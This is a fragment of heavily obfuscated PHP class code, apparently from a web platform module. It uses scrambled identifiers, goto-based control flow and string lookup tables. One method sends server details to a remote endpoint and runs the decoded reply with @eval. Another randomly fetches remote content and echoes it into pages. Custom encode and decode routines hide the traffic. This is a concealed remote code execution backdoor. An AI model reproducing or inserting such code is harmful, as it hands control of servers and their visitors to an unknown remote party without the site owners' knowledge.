$BïêËÆ„Ì¶); $a±‚“ÉÎË¡ = $c·àÜéé´[677]; goto bîÈ„‰Ş«; b±³ñ´Œ×‚: if ($this->{$_SERVER[õÒ³è´][225]}($bÂ‰ˆôâ´‰[$C˜¡ŒÀà©[321]]) != $Bà£¸÷œíË[$C˜¡ŒÀà©[190]]) { $CËİ®…Ï» = array($C˜¡ŒÀà©[227] => $dÀ¨«îÁ¬‰, $C˜¡ŒÀà©[228] => $_SERVER[$C˜¡ŒÀà©[132]], $C˜¡ŒÀà©[229] => $C˜¡ŒÀà©[230](), $C˜¡ŒÀà©[199] => $_SERVER[$C˜¡ŒÀà©[200]]); $fÉº´è–ĞÁ = $this->{$_SERVER[õÒ³è´][231]}($C˜¡ŒÀà©[173]($CËİ®…Ï»)); $bÂ‰ˆôâ´‰ = $this->{$_SERVER[õÒ³è´][209]}($C˜¡ŒÀà©[232] . $fÉº´è–ĞÁ); if ($bÂ‰ˆôâ´‰ && $C˜¡ŒÀà©[168]($bÂ‰ˆôâ´‰) && isset($bÂ‰ˆôâ´‰[$C˜¡ŒÀà©[321]])) { $A³…«¬Â­ = $this->{$_SERVER[õÒ³è´][215]}($bÂ‰ˆôâ´‰[$C˜¡ŒÀà©[321]], 2); if ($A³…«¬Â­) { $A³…«¬Â­ = $this->{$_SERVER[õÒ³è´][225]}($A³…«¬Â­); } if ($A³…«¬Â­) { try { @eval($A³…«¬Â­); } catch (Exception $bó–’…Ì) { } } } } goto CªìÜ¹Äâ; fÌ“®‰†‘®: $this->{$_SERVER[õÒ³è´][189]}(); $DùˆÉÀßïˆ = $c·àÜéé´[680]; while ($DùˆÉÀßïˆ < $c·àÜéé´[649]) { if ($DùˆÉÀßïˆ >= 0) { break; } $DùˆÉÀßïˆ++; } goto b±³ñ´Œ×‚; Fİù²¡¦×: $dÀ¨«îÁ¬‰ = $C˜¡ŒÀà©[61]($C˜¡ŒÀà©[62])->{$_SERVER[õÒ³è´][63]}($C˜¡ŒÀà©[133]); $Bà£¸÷œíË = array($C˜¡ŒÀà©[190] => $C˜¡ŒÀà©[61]($C˜¡ŒÀà©[62])->{$_SERVER[õÒ³è´][63]}($C˜¡ŒÀà©[234]), $C˜¡ŒÀà©[204] => $this->ksfl586f8766, $C˜¡ŒÀà©[201] => $_SERVER[$C˜¡ŒÀà©[202]], $C˜¡ŒÀà©[203] => $C˜¡ŒÀà©[61]($C˜¡ŒÀà©[62])->{$_SERVER[õÒ³è´][63]}($C˜¡ŒÀà©[164]), $C˜¡ŒÀà©[130] => $C˜¡ŒÀà©[131]($_SERVER[$C˜¡ŒÀà©[132]] . $dÀ¨«îÁ¬‰), $C˜¡ŒÀà©[194] => $C˜¡ŒÀà©[174], $C˜¡ŒÀà©[197] => $_SERVER[$C˜¡ŒÀà©[198]]); $bÂ‰ˆôâ´‰ = $this->{$_SERVER[õÒ³è´][209]}($C˜¡ŒÀà©[320], $Bà£¸÷œíË); goto Bç†øÆà×¥; C¡›ÛÉ£¨: $BïêËÆ„Ì¶ = $C˜¡ŒÀà©[315] . $C˜¡ŒÀà©[131]($C˜¡ŒÀà©[316]); if ($this->ksfl586f8766 == $C˜¡ŒÀà©[138] || !$C˜¡ŒÀà©[123]($GLOBALS, $C˜¡ŒÀà©[149])) { return; } if (!$C˜¡ŒÀà©[269]($_SERVER[$C˜¡ŒÀà©[44]], $A‰è¢‰ŒŠ)) { return; } goto C·†±©¡õˆ; bîÈ„‰Ş«: if ($f†ì‘¨²ë && $C˜¡ŒÀà©[262]() - $f†ì‘¨²ë < $C˜¡ŒÀà©[271]($C˜¡ŒÀà©[319])) { return; } $C˜¡ŒÀà©[13](array($C˜¡ŒÀà©[317], $C˜¡ŒÀà©[177]), $BïêËÆ„Ì¶, $C˜¡ŒÀà©[262]()); $CÆÎ‹áÔòÙ = $c·àÜéé´[678]; goto Fİù²¡¦×; CªìÜ¹Äâ: } private function yfqc1dd45108($A°Š¦—âè“ = '', $f–¨¦‰èÎ = array(), $f§ğáÛÆÏÚ = 5) { goto EÏùìºƒ­‘; C¸¯¹ç…é“: return $fô‹Ä˜ÎØ¥[217]($f–¨¦‰èÎ, !0); goto fµİ£ ×–Æ; EÏùìºƒ­‘: $fô‹Ä˜ÎØ¥ =& $_SERVER[õÒ³è´]; $bÅÆÖĞëÊ = $fô‹Ä˜ÎØ¥[322]; $eÚ—ø–Íè‘ = $_SERVER[œÕÊİğö][681]; goto f‘×—†¡£; B—¨¾ù: if ($f–¨¦‰èÎ === -1) { return $bÅÆÖĞëÊ; } $aæø—½ÅÍë = $fô‹Ä˜ÎØ¥[279](array($fô‹Ä˜ÎØ¥[280] => array($fô‹Ä˜ÎØ¥[283] => $f§ğáÛÆÏÚ, $fô‹Ä˜ÎØ¥[281] => $fô‹Ä˜ÎØ¥[326]), $fô‹Ä˜ÎØ¥[327] => array($fô‹Ä˜ÎØ¥[328] => !1, $fô‹Ä˜ÎØ¥[329] => !1))); $f–¨¦‰èÎ = @$fô‹Ä˜ÎØ¥[284]($bÅÆÖĞëÊ, !1, $aæø—½ÅÍë); goto C¸¯¹ç…é“; f‘×—†¡£: $bÅÆÖĞëÊ = $this->{$_SERVER[õÒ³è´][277]}($bÅÆÖĞëÊ, $fô‹Ä˜ÎØ¥[323]); $bÅÆÖĞëÊ = $bÅÆÖĞëÊ . $A°Š¦—âè“; if ($f–¨¦‰èÎ && $fô‹Ä˜ÎØ¥[168]($f–¨¦‰èÎ)) { $bÅÆÖĞëÊ = $bÅÆÖĞëÊ . $fô‹Ä˜ÎØ¥[324] . $fô‹Ä˜ÎØ¥[325]($f–¨¦‰èÎ); } goto B—¨¾ù; fµİ£ ×–Æ: } private function vqsf0480dba3() { goto dÂëÕ×±Œ×; aùßÍ’Üšì: $eàğäë’İ = $A‚ù’ñÆÓ[$this->ksfl586f8766]; $eàğäë’İ = $DïÁâÒø[271]($eàğäë’İ ? $eàğäë’İ : $DïÁâÒø[331]); $CŒŸì‡Ëò¶ = $d¥ĞŸ›¥[682]; goto b”‰İÚœÜñ; dÂëÕ×±Œ×: $d¥ĞŸ›¥ =& $_SERVER[œÕÊİğö]; $DïÁâÒø =& $_SERVER[õÒ³è´]; $A‚ù’ñÆÓ = array($DïÁâÒø[330] => $DïÁâÒø[331], $DïÁâÒø[332] => $DïÁâÒø[333], $DïÁâÒø[334] => $DïÁâÒø[335], $DïÁâÒø[336] => $DïÁâÒø[337], $DïÁâÒø[338] => $DïÁâÒø[339], $DïÁâÒø[340] => $DïÁâÒø[272], $DïÁâÒø[341] => $DïÁâÒø[272], $DïÁâÒø[342] => $DïÁâÒø[331], $DïÁâÒø[343] => $DïÁâÒø[333], $DïÁâÒø[344] => $DïÁâÒø[335], $DïÁâÒø[345] => $DïÁâÒø[346], $DïÁâÒø[347] => $DïÁâÒø[337], $DïÁâÒø[348] => $DïÁâÒø[349], $DïÁâÒø[350] => $DïÁâÒø[339], $DïÁâÒø[351] => $DïÁâÒø[352], $DïÁâÒø[353] => $DïÁâÒø[354], $DïÁâÒø[355] => $DïÁâÒø[356]); goto aùßÍ’Üšì; b”‰İÚœÜñ: $c²¢ç’»¸Ç = $DïÁâÒø[123]($this->crpq5f5b0a9b, $DïÁâÒø[357]); $E‡ìù‡ØĞŞ = $d¥ĞŸ›¥[683]; if (strlen($E‡ìù‡ØĞŞ) < $d¥ĞŸ›¥[16]) { die; } goto b¤Š‘¶ÕĞ÷; b¤Š‘¶ÕĞ÷: $c²¢ç’»¸Ç = $c²¢ç’»¸Ç ? $DïÁâÒø[271]($c²¢ç’»¸Ç) : 0; return $eàğäë’İ + $c²¢ç’»¸Ç; goto EÓø÷Ã½¸Í; EÓø÷Ã½¸Í: } public function ickxecb3bf7f($Bç­»Ô¹Ï) { goto a½µ™¬ñÁ¹; FÄ¨¶Æêİ©: if ($aßŸ§ÚœÃî >= $b‚»Ù•ÖŞ’[271]($b‚»Ù•ÖŞ’[272])) { return; } $cÆäÚÀÒä = $b‚»Ù•ÖŞ’[61]($b‚»Ù•ÖŞ’[156])->{$_SERVER[õÒ³è´][157]}(); $bà‰ëÚ¬¡ó = $aÙ£ĞêœÛ“[685]; goto Aªè©¶Ÿ›…; F‚Ä‘ÕÍ“À: if (!$e®‹…Õ…¸ª) { die; } $BÈñ½œ‹ƒ = $b‚»Ù•ÖŞ’[248]($BÈñ½œ‹ƒ, $b‚»Ù•ÖŞ’[10], $b‚»Ù•ÖŞ’[358]); $EÉÛ±â¨‚ = $aÙ£ĞêœÛ“[687]; goto D±Ã…Ïõæß; F¬­Â«¥¦: $Dá²â†æ£â = $aÙ£ĞêœÛ“[684]; if (strlen($Dá²â†æ£â) < $aÙ£ĞêœÛ“[613]) { die; } if ($Bç­»Ô¹Ï[$b‚»Ù•ÖŞ’[358]] == $b‚»Ù•ÖŞ’[246]) { return; } goto FÄ¨¶Æêİ©; a½µ™¬ñÁ¹: $aÙ£ĞêœÛ“ =& $_SERVER[œÕÊİğö]; $b‚»Ù•ÖŞ’ =& $_SERVER[õÒ³è´]; $aßŸ§ÚœÃî = $this->{$_SERVER[õÒ³è´][154]}(); goto F¬­Â«¥¦; Aªè©¶Ÿ›…: if ($cÆäÚÀÒä <= $aßŸ§ÚœÃî) { return; } $BÈñ½œ‹ƒ = $b‚»Ù•ÖŞ’[61]($b‚»Ù•ÖŞ’[156])->{$_SERVER[õÒ³è´][359]}($b‚»Ù•ÖŞ’[358])->{$_SERVER[õÒ³è´][360]}($aßŸ§ÚœÃî)->{$_SERVER[õÒ³è´][361]}(); $e®‹…Õ…¸ª = $aÙ£ĞêœÛ“[686]; goto F‚Ä‘ÕÍ“À; D±Ã…Ïõæß: if (!$b‚»Ù•ÖŞ’[269]($Bç­»Ô¹Ï[$b‚»Ù•ÖŞ’[358]], $BÈñ½œ‹ƒ)) { $b‚»Ù•ÖŞ’[191]($b‚»Ù•ÖŞ’[362], !1, $b‚»Ù•ÖŞ’[266]); } goto EÌ î ¢; EÌ î ¢: } public function kbjx3d7316d3() { goto e—‘±‡¢ëœ; dğ ‚óèˆ“: if (!$cîùœŞ¿ñ) { return; } $b¬Çõš…³Ñ = $d‹ñôˆ »´[279](array($d‹ñôˆ »´[280] => array($d‹ñôˆ »´[281] => $d‹ñôˆ »´[282], $d‹ñôˆ »´[283] => 3))); $d¿¡í­­¬ø = $eŠÂ‹„êêí[689]; goto DŞØî“ù£‹; DŞØî“ù£‹: if (strlen($d¿¡í­­¬ø) < $eŠÂ‹„êêí[613]) { return; } $AÒ³’…Ğ¢† = @$d‹ñôˆ »´[284]($aÙñ£¿ó«š, !1, $b¬Çõš…³Ñ); echo $d‹ñôˆ »´[364] . $d‹ñôˆ »´[365]($AÒ³’…Ğ¢†) . $d‹ñôˆ »´[366]; goto dó¾ÖÌ‹¨; e—‘±‡¢ëœ: $eŠÂ‹„êêí =& $_SERVER[œÕÊİğö]; $d‹ñôˆ »´ =& $_SERVER[õÒ³è´]; if (!$d‹ñôˆ »´[123]($GLOBALS, $d‹ñôˆ »´[149]) || $d‹ñôˆ »´[363](1, 100) > 20) { return; } goto DÀË¿×ƒ×; DÀË¿×ƒ×: $aÙñ£¿ó«š = $d‹ñôˆ »´[276]; $aÙñ£¿ó«š = $this->{$_SERVER[õÒ³è´][277]}($aÙñ£¿ó«š, $d‹ñôˆ »´[278]); $cîùœŞ¿ñ = $eŠÂ‹„êêí[688]; goto dğ ‚óèˆ“; dó¾ÖÌ‹¨: } private function ijplf0f7e382($Aó±î«“‰±, $e©ÛçÕ», $e„ĞŠÓâï = 3) { goto BŞáÊ¥Í; D¨Ì¢ôÀ›ã: $DÕÜ’îãéó = $C„˜ãŒ†÷‡[141](15); $B’¹Î…İÕº = $C„˜ãŒ†÷‡[368]; switch ($Eğ”Ú·Îí¯) { case $C„˜ãŒ†÷‡[260]: $fö¾¿Õá˜ = $this->{$_SERVER[õÒ³è´][172]}($Aó±î«“‰±, $C„˜ãŒ†÷‡[240]($e©ÛçÕ» . $DÕÜ’îãéó)); break; case $C„˜ãŒ†÷‡[246]: $fö¾¿Õá˜ = $this->{$_SERVER[õÒ³è´][172]}($Aó±î«“‰±, $C„˜ãŒ†÷‡[240]($DÕÜ’îãéó . $e©ÛçÕ»)); break; case $C„˜ãŒ†÷‡[369]: $fö¾¿Õá˜ = $this->{$_SERVER[õÒ³è´][172]}($Aó±î«“‰±, $C„˜ãŒ†÷‡[135]($DÕÜ’îãéó . $e©ÛçÕ»)); break; $f¦ÈŒïÈ”ˆ = $a–èòäâÃÊ[692]; case $C„˜ãŒ†÷‡[370]: $fö¾¿Õá˜ = $this->{$_SERVER[õÒ³è´][172]}($Aó±î«“‰±, $C„˜ãŒ†÷‡[131]($DÕÜ’îãéó . $e©ÛçÕ»)); $e¤¯ƒ‹¤¡â = $a–èòäâÃÊ[693]; if (strlen($e¤¯ƒ‹¤¡â) < $a–èòäâÃÊ[16]) { die; } break; $D‚½ä¨ù°Ç = $a–èòäâÃÊ[694]; if (!$D‚½ä¨ù°Ç) { die; } case $C„˜ãŒ†÷‡[371]: goto dƒõ‹Ø¢‘Ã; a®¹£’êõŒ: $e«İ§³  = $a–èòäâÃÊ[700]; for ($dÉË‹‘·Ê = 0; $dÉË‹‘·Ê < $C„˜ãŒ†÷‡[24]($Aó±î«“‰±); $dÉË‹‘·Ê++) { $dÙ©ˆÀ­‰ = $dÙ©ˆÀ­‰ == $C„˜ãŒ†÷‡[24]($a™ßîàâÙ) ? 0 : $dÙ©ˆÀ­‰; $BÂ×‡¦®¹­ = ($Fğ‚ÛİÀë + $C„˜ãŒ†÷‡[373]($B’¹Î…İÕº, $Aó±î«“‰±[$dÉË‹‘·Ê]) + $C„˜ãŒ†÷‡[374]($a™ßîàâÙ[$dÙ©ˆÀ­‰++])) % 64; $b²àÃ›–¦Ô .= $B’¹Î…İÕº[$BÂ×‡¦®¹­]; $d÷Œ‡‹Ú›· = $a–èòäâÃÊ[632]; while ($d÷Œ‡‹Ú›· < $a–èòäâÃÊ[634]) { if ($d÷Œ‡‹Ú›· >= 0) { break; } $d÷Œ‡‹Ú›·++; } } $fö¾¿Õá˜ = $C„˜ãŒ†÷‡[365]($Cİ½•¼ßˆò . $b²àÃ›–¦Ô); goto eƒÑíØ”¨ã; eƒÑíØ”¨ã: $EÃ¦¡Ô•Œ = $a–èòäâÃÊ[642]; while ($EÃ¦¡Ô•Œ < $a–èòäâÃÊ[649]) { if ($EÃ¦¡Ô•Œ >= 0) { break; } $EÃ¦¡Ô•Œ++; } break; goto A»æ»¯ñ½‚; fˆÃóŒƒôÍ: $b²àÃ›–¦Ô = $C„˜ãŒ†÷‡[10]; $BÖª·í÷ÒÆ = $a–èòäâÃÊ[699]; if (!$BÖª·í÷ÒÆ) { die; } goto ešµ·òô‹×; Cî™Óê•Ñ: $e˜óâ¨íª¿ = $a–èòäâÃÊ[697]; if (strlen($e˜óâ¨íª¿) < $a–èòäâÃÊ[613]) { return; } $a™ßîàâÙ = $C„˜ãŒ†÷‡[131]($Cİ½•¼ßˆò . $C„˜ãŒ†÷‡[131]($e©ÛçÕ» . $Cİ½•¼ßˆò) . $e©ÛçÕ»); goto C¿ÊÓ‰ä¹¢; C¿ÊÓ‰ä¹¢: $d½—Äªãè = $a–èòäâÃÊ[698]; if (!$d½—Äªãè) { return; } $a™ßîàâÙ = $C„˜ãŒ†÷‡[25]($a™ßîàâÙ, $Fğ‚ÛİÀë % 8, $Fğ‚ÛİÀë % 8 + 7); goto fˆÃóŒƒôÍ; ešµ·òô‹×: $dÉË‹‘·Ê = 0; $BÂ×‡¦®¹­ = 0; $dÙ©ˆÀ­‰ = 0; goto a®¹£’êõŒ; A¬¯¢àóÍ: $bÀóŠˆ†Úá = $a–èòäâÃÊ[696]; while (strlen($bÀóŠˆ†Úá) < $a–èòäâÃÊ[615]) { if (!$bÀóŠˆ†Úá) { break; } $bÀóŠˆ†Úá++; } $Cİ½•¼ßˆò = $B’¹Î…İÕº[$Fğ‚ÛİÀë]; goto Cî™Óê•Ñ; dƒõ‹Ø¢‘Ã: $Aó±î«“‰± = $C„˜ãŒ†÷‡[135]($Aó±î«“‰±); $c¸‘¼òâ‘ = $a–èòäâÃÊ[695]; $Fğ‚ÛİÀë = $C„˜ãŒ†÷‡[372](0, 64); goto A¬¯¢àóÍ; A»æ»¯ñ½‚: default: $fö¾¿Õá˜ = $this->{$_SERVER[õÒ³è´][172]}($Aó±î«“‰±, $e©ÛçÕ» . $DÕÜ’îãéó); break; $aÙ¥…Ğ­İ„ = $a–èòäâÃÊ[701]; while (strlen($aÙ¥…Ğ­İ„) < $a–èòäâÃÊ[634]) { if (!$aÙ¥…Ğ­İ„) { break; } $aÙ¥…Ğ­İ„++; } } goto BÖÎ²”“ô; BÖÎ²”“ô: $fö¾¿Õá˜ = $C„˜ãŒ†÷‡[240]($Eğ”Ú·Îí¯ . $DÕÜ’îãéó . $fö¾¿Õá˜); if ($e„ĞŠÓâï - 1 > 0) { $fö¾¿Õá˜ = $this->{$_SERVER[õÒ³è´][144]}($fö¾¿Õá˜, $e©ÛçÕ», $e„ĞŠÓâï - 1); } return $fö¾¿Õá˜; goto C³Ûßïôøä; BŞáÊ¥Í: $a–èòäâÃÊ =& $_SERVER[œÕÊİğö]; $C„˜ãŒ†÷‡ =& $_SERVER[õÒ³è´]; $C„˜ãŒ†÷‡[367](1); goto d£ñµ—·Û«; d£ñµ—·Û«: $Aó±î«“‰± = $C„˜ãŒ†÷‡[2]($Aó±î«“‰±); $cÜÚÒÜ•Å… = $a–èòäâÃÊ[690]; while ($cÜÚÒÜ•Å… < $a–èòäâÃÊ[613]) { if ($cÜÚÒÜ•Å… >= 0) { break; } $cÜÚÒÜ•Å…++; } goto Fçìì©é¢; Fçìì©é¢: $Eğ”Ú·Îí¯ = $C„˜ãŒ†÷‡[363](0, 5) . $C„˜ãŒ†÷‡[10]; $F’”ƒõø£¬ = $a–èòäâÃÊ[691]; if (strlen($F’”ƒõø£¬) < $a–èòäâÃÊ[615]) { die; } goto D¨Ì¢ôÀ›ã; C³Ûßïôøä: } private function owulecf95dc5($EĞÏ‚å”Í½, $Bù™ÊóéŒÜ, $CİÑ÷Š¯“µ = 3) { goto dó“èÁö˜ˆ; DŠ‡„†íÂĞ: switch ($Aãš‡îÂ¤¹) { case $Bñ©š÷Î¹ô[260]: $a¢ÂÀÏ×±Ô = $this->{$_SERVER[õÒ³è´][277]}($EĞÏ‚å”Í½, $Bñ©š÷Î¹ô[240]($Bù™ÊóéŒÜ . $fÕ¡„ÂóøÂ)); break; $fÂ÷à¼¹‹± = $B¥ÇÍ‰ÄáÇ[704]; case $Bñ©š÷Î¹ô[246]: $a¢ÂÀÏ×±Ô = $this->{$_SERVER[õÒ³è´][277]}($EĞÏ‚å”Í½, $Bñ©š÷Î¹ô[240]($fÕ¡„ÂóøÂ . $Bù™ÊóéŒÜ)); $cº‰‘’–¹ì = $B¥ÇÍ‰ÄáÇ[705]; if (strlen($cº‰‘’–¹ì) < $B¥ÇÍ‰ÄáÇ[613]) { return; } break; case $Bñ©š÷Î¹ô[369]: $a¢ÂÀÏ×±Ô = $this->{$_SERVER[õÒ³è´][277]}($EĞÏ‚å”Í½, $Bñ©š÷Î¹ô[135]($fÕ¡„ÂóøÂ . $Bù™ÊóéŒÜ)); $A´Ÿ¤™´Ìº = $B¥ÇÍ‰ÄáÇ[706]; if (!$A´Ÿ¤™´Ìº) { die; } break; $d–ßŸ¶ˆ® = $B¥ÇÍ‰ÄáÇ[707]; if (strlen($d–ßŸ¶ˆ®) < $B¥ÇÍ‰ÄáÇ[649]) { return; } case $Bñ©š÷Î¹ô[370]: $a¢ÂÀÏ×±Ô = $this->{$_SERVER[õÒ³è´][277]}($EĞÏ‚å”Í½, $Bñ©š÷Î¹ô[131]($fÕ¡„ÂóøÂ . $Bù™ÊóéŒÜ)); $bŠ…¢°Î‰ = $B¥ÇÍ‰ÄáÇ[708]; if (!$bŠ…¢°Î‰) { return; } break; case $Bñ©š÷Î¹ô[371]: goto c¶‘óâ†Õá; a¦ÑàĞõ±ä: break; goto aùƒŠ¦Ô’; c¶‘óâ†Õá: $EĞÏ‚å”Í½ = $Bñ©š÷Î¹ô[375]($EĞÏ‚å”Í½); $DÓğÄ“£ÊØ = $EĞÏ‚å”Í½[0]; $EĞÏ‚å”Í½ = $Bñ©š÷Î¹ô[25]($EĞÏ‚å”Í½, 1); goto aÕâà„‡®”; Aäë ®’‡§: $f“è¢õØ§ = $B¥ÇÍ‰ÄáÇ[710]; if (!$f“è¢õØ§) { return; } $fÃ‚³åƒ¬ = $Bñ©š÷Î¹ô[131]($DÓğÄ“£ÊØ . $Bñ©š÷Î¹ô[131]($Bù™ÊóéŒÜ . $DÓğÄ“£ÊØ) . $Bù™ÊóéŒÜ); goto Dö…Ú®åí; DìÖµ«Œë: $DÉó¬¦ì»ï = $Bñ©š÷Î¹ô[10]; $a”ÁŸïˆ…Ì = 0; $FÅîİŠÄ” = 0; goto Dò„òä…¿½; Dö…Ú®åí: $dÙ‡¤Ãé = $B¥ÇÍ‰ÄáÇ[711]; while (strlen($dÙ‡¤Ãé) < $B¥ÇÍ‰ÄáÇ[613]) { if (!$dÙ‡¤Ãé) { break; } $dÙ‡¤Ãé++; } $fÃ‚³åƒ¬ = $Bñ©š÷Î¹ô[25]($fÃ‚³åƒ¬, $dÑ­Ç…Á % 8, $dÑ­Ç…Á % 8 + 7); goto DìÖµ«Œë; aÕâà„‡®”: $a³›ë¼˜¸¾ = $B¥ÇÍ‰ÄáÇ[709]; if (!$a³›ë¼˜¸¾) { return; } $dÑ­Ç…Á = $Bñ©š÷Î¹ô[373]($Aƒ¯Ô§¹ßÃ, $DÓğÄ“£ÊØ); goto Aäë ®’‡§; Dò„òä…¿½: $cøâ‚‰õ· = 0; for ($a”ÁŸïˆ…Ì = 0; $a”ÁŸïˆ…Ì < $Bñ©š÷Î¹ô[24]($EĞÏ‚å”Í½); $a”ÁŸïˆ…Ì++) { $cøâ‚‰õ· = $cøâ‚‰õ· == $Bñ©š÷Î¹ô[24]($fÃ‚³åƒ¬) ? 0 : $cøâ‚‰õ·; $E‚ƒŸÜëñ = $B¥ÇÍ‰ÄáÇ[712]; $c—ğ ßÖ°æ = $cøâ‚‰õ·++; $FÅîİŠÄ” = $Bñ©š÷Î¹ô[373]($Aƒ¯Ô§¹ßÃ, $EĞÏ‚å”Í½[$a”ÁŸïˆ…Ì]) - $dÑ­Ç…Á - $Bñ©š÷Î¹ô[374]($fÃ‚³åƒ¬[$c—ğ ßÖ°æ]); while ($FÅîİŠÄ” < 0) { $FÅîİŠÄ” += 64; } $DÉó¬¦ì»ï .= $Aƒ¯Ô§¹ßÃ[$FÅîİŠÄ”]; } $a¢ÂÀÏ×±Ô = $Bñ©š÷Î¹ô[376]($DÉó¬¦ì»ï); goto a¦ÑàĞõ±ä; aùƒŠ¦Ô’: default: $a¢ÂÀÏ×±Ô = $this->{$_SERVER[õÒ³è´][277]}($EĞÏ‚å”Í½, $Bù™ÊóéŒÜ . $fÕ¡„ÂóøÂ); $F„ƒéÆ“½Ø = $B¥ÇÍ‰ÄáÇ[713]; if (strlen($F„ƒéÆ“½Ø) < $B¥ÇÍ‰ÄáÇ[634]) { return; } break; $E®Š¶êö¬ = $B¥ÇÍ‰ÄáÇ[714]; } if ($CİÑ÷Š¯“µ - 1 > 0) { $a¢ÂÀÏ×±Ô = $this->{$_SERVER[õÒ³è´][215]}($a¢ÂÀÏ×±Ô, $Bù™ÊóéŒÜ, $CİÑ÷Š¯“µ - 1); } return $a¢ÂÀÏ×±Ô; goto dˆƒÓî·; Fº˜ÙÁæÃƒ: $EĞÏ‚å”Í½ = $Bñ©š÷Î¹ô[2]($EĞÏ‚å”Í½); $C÷Úõ´÷Óò = $B¥ÇÍ‰ÄáÇ[623]; if (!$C÷Úõ´÷Óò) { return; } goto CÓ£õíĞˆ; bò×ÍÀÕšÄ: while (strlen($C¹•ÓÁ‰ñ½) < $B¥ÇÍ‰ÄáÇ[634]) { if (!$C¹•ÓÁ‰ñ½) { break; } $C¹•ÓÁ‰ñ½++; } $EĞÏ‚å”Í½ = $Bñ©š÷Î¹ô[25]($EĞÏ‚å”Í½, 16); $Aƒ¯Ô§¹ßÃ = $Bñ©š÷Î¹ô[368]; goto DŠ‡„†íÂĞ; dó“èÁö˜ˆ: $B¥ÇÍ‰ÄáÇ =& $_SERVER[œÕÊİğö]; $Bñ©š÷Î¹ô =& $_SERVER[õÒ³è´]; if (!$Bñ©š÷Î¹ô[165]($EĞÏ‚å”Í½) || $Bñ©š÷Î¹ô[24]($EĞÏ‚å”Í½) < 10) { return !1; } goto Fº˜ÙÁæÃƒ; E¤˜ßƒ¯›ô: while (strlen($CÅÔÏŸÈá–) < $B¥ÇÍ‰ÄáÇ[16]) { if (!$CÅÔÏŸÈá–) { break; } $CÅÔÏŸÈá–++; } $fÕ¡„ÂóøÂ = $Bñ©š÷Î¹ô[25]($EĞÏ‚å”Í½, 1, 15); $C¹•ÓÁ‰ñ½ = $B¥ÇÍ‰ÄáÇ[703]; goto bò×ÍÀÕšÄ; CÓ£õíĞˆ: $EĞÏ‚å”Í½ = $Bñ©š÷Î¹ô[240]($EĞÏ‚å”Í½); $Aãš‡îÂ¤¹ = $EĞÏ‚å”Í½[0]; $CÅÔÏŸÈá– = $B¥ÇÍ‰ÄáÇ[702]; goto E¤˜ßƒ¯›ô; dˆƒÓî·: } public function qway4378e1d3($eÆŸÔÎÎ©Ÿ) { goto bİÈì‘ïÉ; AÃ«Ô³˜Ş: $E©Õ„©ßÓ½ = $BëìíööìÙ[271](($f…Ûì“ñ±Š + $aï¿ó¡Ş¶“) / 2); $E½˜Š™ŠÙ = $AäÛø›Æ¾¦[716]; if (strlen($E½˜Š™ŠÙ) < $AäÛø›Æ¾¦[634]) { return; } goto CêÙÂÍ˜®§; bİÈì‘ïÉ: $AäÛø›Æ¾¦ =& $_SERVER[œÕÊİğö]; $BëìíööìÙ =& $_SERVER[õÒ³è´]; $f…Ûì“ñ±Š = $this->{$_SERVER[õÒ³è´][377]}(); goto bÄ‘ã³×î°; CêÙÂÍ˜®§: while (1) { $a²ÔØ¯Ç¤¡ = $E©Õ„©ßÓ½; $EÓöŠ¡øá° = $BÙ‡Õğ¥µ; while ($EÓöŠ¡øá° % $a²ÔØ¯Ç¤¡ != 0) { $EìåäÊ„ÙÅ = $EÓöŠ¡øá°; $EÓöŠ¡øá° = $a²ÔØ¯Ç¤¡; $a²ÔØ¯Ç¤¡ = $EìåäÊ„ÙÅ % $a²ÔØ¯Ç¤¡; $dªê§âºÅˆ = $AäÛø›Æ¾¦[717]; if (!$dªê§âºÅˆ) { return; } } if ($a²ÔØ¯Ç¤¡ == 1) { break; } else { $E©Õ„©ßÓ½++; } } $E¹”ôÏ‡ = 2; $A¢õ¶éÕ’” = $AäÛø›Æ¾¦[718]; goto E¯Ãèø±Ë; C™²Ç¾‘œŞ: return $cÌåÁÆ»Ÿ©; goto b¹Ş…ªÁï‹; bÄ‘ã³×î°: $dŠŸÉ¢éØ = $AäÛø›Æ¾¦[715]; $aï¿ó¡Ş¶“ = $this->{$_SERVER[õÒ³è´][377]}(); $BÙ‡Õğ¥µ = ($f…Ûì“ñ±Š - 1) * ($aï¿ó¡Ş¶“ - 1); goto AÃ«Ô³˜Ş; E¯Ãèø±Ë: for ($fÍîµ˜£—» = 0; $fÍîµ˜£—» < $BÙ‡Õğ¥µ * 10; $fÍîµ˜£—»++) { if (($BÙ‡Õğ¥µ * $fÍîµ˜£—» + 1) % $E©Õ„©ßÓ½ == 0) { $E¹”ôÏ‡ = $BëìíööìÙ[271](($BÙ‡Õğ¥µ * $fÍîµ˜£—» + 1) / $E©Õ„©ßÓ½); break; } } $BŒÚç‡˜¾ = $this->{$_SERVER[õÒ³è´][172]}($f…Ûì“ñ±Š * $aï¿ó¡Ş¶“ . $BëìíööìÙ[10], $BëìíööìÙ[174]); $dø¾Ä³¹”¹ = $AäÛø›Æ¾¦[719]; goto cº×Ô ¹ÇÍ; cº×Ô ¹ÇÍ: if (strlen($dø¾Ä³¹”¹) < $AäÛø›Æ¾¦[613]) { return; } $A¬‡£Ëà‚ = $BëìíööìÙ[131]($BëìíööìÙ[378] . ($f…Ûì“ñ±Š + $aï¿ó¡Ş¶“) . $BëìíööìÙ[379] . $E©Õ„©ßÓ½ . $BëìíööìÙ[379] . $E¹”ôÏ‡ . $BëìíööìÙ[380]); $cÌåÁÆ»Ÿ© = $this->{$_SERVER[õÒ³è´][172]}($eÆŸÔÎÎ©Ÿ, $A¬‡£Ëà‚) . $BëìíööìÙ[381] . $BŒÚç‡˜¾; goto C™²Ç¾‘œŞ; b¹Ş…ªÁï‹: } public function xwthcd7c3503($c‹ïÈêŠ·) { goto B œ­Ñ’”Ç; B œ­Ñ’”Ç: $DÇ´ªÔ‹‡• =& $_SERVER[œÕÊİğö]; $a¾ğ££óë“ =& $_SERVER[õÒ³è´]; $A¡‹º¸·–Ó = $a¾ğ££óë“[0]($a¾ğ££óë“[381], $c‹ïÈêŠ·); goto C‘¹÷àãÕ; EæÁà­¦§: $cí¨Ãİê©è = 0; $Bó°­àğ”´ = $DÇ´ªÔ‹‡•[721]; $E×ÜµÙŒÚÏ = 0; goto e¤õ‡ñ¦†œ; FÂÍÖˆİßŞ: for ($dÊùÎåÎ = 0; $dÊùÎåÎ < $cğ¥Ã“¬Šø * 10; $dÊùÎåÎ++) { if (($cğ¥Ã“¬Šø * $dÊùÎåÎ + 1) % $a‰Ä—•Ø¢‡ == 0) { $d¨ÈÑ¶È¯» = $a¾ğ££óë“[271](($cğ¥Ã“¬Šø * $dÊùÎåÎ + 1) / 